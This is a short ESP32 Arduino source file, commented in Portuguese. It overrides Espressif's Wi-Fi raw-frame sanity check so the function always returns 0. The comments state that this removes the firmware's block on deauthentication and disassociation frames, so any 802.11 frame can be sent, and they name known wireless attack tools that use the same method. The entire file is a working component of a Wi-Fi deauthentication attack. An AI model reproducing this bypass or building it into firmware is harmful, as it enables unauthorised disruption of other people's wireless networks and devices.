// ============================================================
// wifi_bypass.cpp
// BYPASS DO ieee80211_raw_frame_sanity_check
// Sem isso, o ESP32 bloqueia frames de deauth/disassoc
// ============================================================
#include <Arduino.h>
#include <stdbool.h>

// Esta funcao sobrescreve a funcao de verificacao das bibliotecas
// WiFi fechadas da Espressif. Fazendo ela sempre retornar 0,
// qualquer frame 802.11 pode ser transmitido, incluindo deauth.
// Metodo usado por: Bruce, Marauder, GhostESP, Risinek, etc.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg;
    (void)arg2;
    (void)arg3;
    return 0;  // "Tudo OK, pode enviar"
}

